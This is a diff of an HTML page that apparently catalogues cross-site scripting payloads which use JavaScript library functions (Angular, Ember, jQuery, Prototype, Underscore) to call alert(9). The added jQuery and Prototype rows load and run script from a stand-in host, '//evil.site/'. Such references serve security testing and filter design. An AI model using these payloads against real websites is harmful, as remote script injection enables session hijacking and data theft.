@@ -328,7 +328,7 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
   <tr>
   <td class="example">window[<span class="payload">/alert/.source</span>](9)
 <tr>
-  <td rowspan="10">Harness functions from a JavaScript library
+  <td rowspan="12">Harness functions from a JavaScript library
   <td rowspan="2"><a href="http://angularjs.org/">Angular</a>
   <td class="example">angular.bind(self, alert, 9)()
   <tr>
@@ -337,15 +337,19 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
   <td><a href="http://emberjs.com/">Ember JS</a>
   <td class="example">Ember.run(null, alert, 9)
   <tr>
-  <td rowspan="2"><a href="http://jquery.com/">jQuery</a>
-  <td class="example">$.getScript("//evil.site/")
+  <td rowspan="4"><a href="http://jquery.com/">jQuery</a>
+  <td class="example">$.get('//evil.site/')<br><span class="comment">(site serves <span class="payload">alert(9)</span>)</span>
+  <tr>
+  <td class="example">$.getScript('//evil.site/')<br><span class="comment">(site serves <span class="payload">alert(9)</span>)</span>
+  <tr>
+  <td class="example">$('#main').load('//evil.site/');<br><span class="comment">(site serves <span class="payload">&lt;script&gt;alert(9)&lt;/script&gt;</span>)</span>
   <tr>
   <td class="example">$.globalEval(alert(9))
   <tr>
   <td rowspan="2"><a href="http://prototypejs.org/">Prototype</a><br><span class="comment">(Ajax will trigger CORS)</span>
   <td class="example">Prototype.K(alert)(9)
   <tr>
-  <td class="example">new Ajax.Request('//evil.site/a.js',<br>{onsuccess:function(transport){transport.headerJSON}})
+  <td class="example">new Ajax.Request('//evil.site/')<br><span class="comment">(site serves <span class="payload">alert(9)</span> and CORS headers)</span>
   <tr>
   <td rowspan="3"><a href="http://underscorejs.org/">Underscore</a>
   <td class="example">_.defer(alert, 9)
